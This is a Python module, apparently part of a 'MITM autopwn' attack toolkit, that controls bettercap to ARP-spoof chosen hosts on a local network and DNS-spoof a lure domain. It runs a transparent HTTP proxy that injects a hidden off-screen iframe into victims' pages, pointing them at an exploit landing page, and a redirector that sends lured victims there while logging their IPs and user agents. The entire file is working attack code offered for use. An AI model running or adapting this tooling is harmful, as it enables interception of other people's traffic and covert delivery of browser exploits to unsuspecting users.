"""
bettercap control for the MITM autopwn orchestrator.
Launches bettercap with the REST API enabled, drives ARP spoofing, the
transparent HTTP proxy with javascript injection of a hidden iframe pointing at
the autopwn landing, and optional DNS spoofing of an operator lure domain. A
local redirector serves the lure bounce so https only victims that resolve the
lure land on the autopwn detection page. Consumes the bettercap event stream
into shared state.
"""

import os
import re
import time
import tempfile
import threading
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
from requests.auth import HTTPBasicAuth


INJECT_TEMPLATE = """(function(){
  try {
    if (window.__ap_done) { return; }
    window.__ap_done = true;
    var f = document.createElement('iframe');
    f.style.position = 'fixed';
    f.style.width = '1px';
    f.style.height = '1px';
    f.style.left = '-100px';
    f.style.top = '-100px';
    f.style.border = '0';
    f.setAttribute('aria-hidden', 'true');
    f.src = '%SRVURI%';
    (document.body || document.documentElement).appendChild(f);
  } catch (e) {}
})();
"""


class BettercapClient:
    def __init__(self, iface, state, api_host="127.0.0.1", api_port=8081,
                 api_user="orchestrator", api_pass="orchestrator", binary="bettercap"):
        self.iface = iface
        self.state = state
        self.api_host = api_host
        self.api_port = api_port
        self.binary = binary
        self.base = "http://%s:%d" % (api_host, api_port)
        self.auth = HTTPBasicAuth(api_user, api_pass)
        self.proc = None
        self._inject_file = None
        self._session = requests.Session()

    def launch(self, ready_timeout=30):
        boot = (
            "set api.rest.address %s; "
            "set api.rest.port %d; "
            "set api.rest.username %s; "
            "set api.rest.password %s; "
            "api.rest on"
        ) % (self.api_host, self.api_port, self.auth.username, self.auth.password)

        cmd = [self.binary, "-iface", self.iface, "-no-colors", "-eval", boot]
        self.proc = subprocess.Popen(
            cmd, stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self._wait_for_api(ready_timeout)

    def _wait_for_api(self, timeout):
        deadline = time.time() + timeout
        last_err = None
        while time.time() < deadline:
            if self.proc.poll() is not None:
                raise RuntimeError("bettercap exited during startup")
            try:
                r = self._session.get(self.base + "/api/session", auth=self.auth, timeout=3)
                if r.status_code == 200:
                    return
            except Exception as exc:
                last_err = exc
            time.sleep(0.5)
        raise RuntimeError("bettercap REST API did not come up (%s)" % last_err)

    def cmd(self, command):
        r = self._session.post(self.base + "/api/session",
                               json={"cmd": command}, auth=self.auth, timeout=10)
        r.raise_for_status()
        return r

    def get_session(self):
        r = self._session.get(self.base + "/api/session", auth=self.auth, timeout=10)
        r.raise_for_status()
        return r.json()

    def start_proxy_inject(self, srvuri):
        self._inject_file = self._write_inject(srvuri)
        self.cmd("set http.proxy.sslstrip false")
        self.cmd("set http.proxy.injectjs %s" % self._inject_file)
        self.cmd("http.proxy on")
        self.state.log("bettercap", "http.proxy injecting iframe to %s" % srvuri)

    def start_spoof(self, targets):
        for ip in targets:
            self.state.add_spoofed_host(ip)
        joined = ",".join(targets)
        self.cmd("set arp.spoof.fullduplex true")
        self.cmd("set arp.spoof.targets %s" % joined)
        self.cmd("arp.spoof on")
        self.state.log("bettercap", "arp.spoof armed for %d targets" % len(targets))

    def start_dns_spoof(self, domain, address):
        self.cmd("set dns.spoof.all false")
        self.cmd("set dns.spoof.domains %s" % domain)
        self.cmd("set dns.spoof.address %s" % address)
        self.cmd("dns.spoof on")
        self.state.log("bettercap", "dns.spoof %s to %s" % (domain, address))

    def _write_inject(self, srvuri):
        payload = INJECT_TEMPLATE.replace("%SRVURI%", srvuri)
        fd, path = tempfile.mkstemp(prefix="ap_inject_", suffix=".js")
        with os.fdopen(fd, "w") as fh:
            fh.write(payload)
        return path

    def read_events(self, stop_event):
        while not stop_event.is_set():
            try:
                r = self._session.get(self.base + "/api/events?n=200", auth=self.auth, timeout=8)
                if r.status_code == 200:
                    events = r.json()
                    for ev in events:
                        self._handle_event(ev)
                    if events:
                        self._session.delete(self.base + "/api/events", auth=self.auth, timeout=5)
            except Exception:
                pass
            time.sleep(1.0)

    def _handle_event(self, ev):
        tag = ev.get("tag", "") or ""
        data = ev.get("data", {})
        message = ev.get("message", "") or ""

        if tag.startswith("dns.spoof"):
            client = _dig(data, "client", "from", "ip")
            domain = _dig(data, "query", "name", "domain")
            addr = _dig(data, "address", "to")
            if not domain:
                m = re.search(r"for\s+([A-Za-z0-9\.\-]+)", message)
                domain = m.group(1) if m else "?"
            if not addr:
                m = re.search(r"to\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", message)
                addr = m.group(1) if m else ""
            self.state.add_dns_hit(client or "?", domain, addr)
        elif tag.startswith("arp.spoof") and message:
            self.state.log("bettercap", message)
        elif tag.startswith("http.proxy") and message:
            self.state.log("bettercap", message)

    def stop(self):
        for command in ("arp.spoof off", "http.proxy off", "dns.spoof off"):
            try:
                self.cmd(command)
            except Exception:
                pass
        if self.proc and self.proc.poll() is None:
            try:
                self.cmd("quit")
            except Exception:
                pass
            time.sleep(1.0)
            if self.proc.poll() is None:
                self.proc.terminate()
                try:
                    self.proc.wait(timeout=5)
                except Exception:
                    self.proc.kill()
        if self._inject_file and os.path.isfile(self._inject_file):
            try:
                os.remove(self._inject_file)
            except OSError:
                pass


class _RedirectHandler(BaseHTTPRequestHandler):
    target = ""
    owner = None

    def do_GET(self):
        if self.owner is not None:
            self.owner.state.mark_served(self.client_address[0],
                                         ua=self.headers.get("User-Agent"))
        self.send_response(302)
        self.send_header("Location", self.target)
        self.end_headers()

    def log_message(self, *args):
        return


class LureRedirector:
    """
    Minimal bounce for the dns.spoof lure. Binds the operator address only so it
    does not interfere with the transparent proxy that intercepts forwarded
    traffic, and 302 redirects any request to the autopwn landing.
    """

    def __init__(self, bind_host, bind_port, srvuri, state):
        self.bind_host = bind_host
        self.bind_port = bind_port
        self.srvuri = srvuri
        self.state = state
        self.httpd = None
        self.thread = None

    def start(self):
        handler = type("BoundRedirect", (_RedirectHandler,),
                       {"target": self.srvuri, "owner": self})
        self.httpd = HTTPServer((self.bind_host, self.bind_port), handler)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        self.state.log("lure", "redirector on %s:%d to %s"
                       % (self.bind_host, self.bind_port, self.srvuri))

    def stop(self):
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except Exception:
                pass


def _dig(data, *keys):
    for k in keys:
        if isinstance(data, dict) and data.get(k) not in (None, ""):
            return data.get(k)
    return None
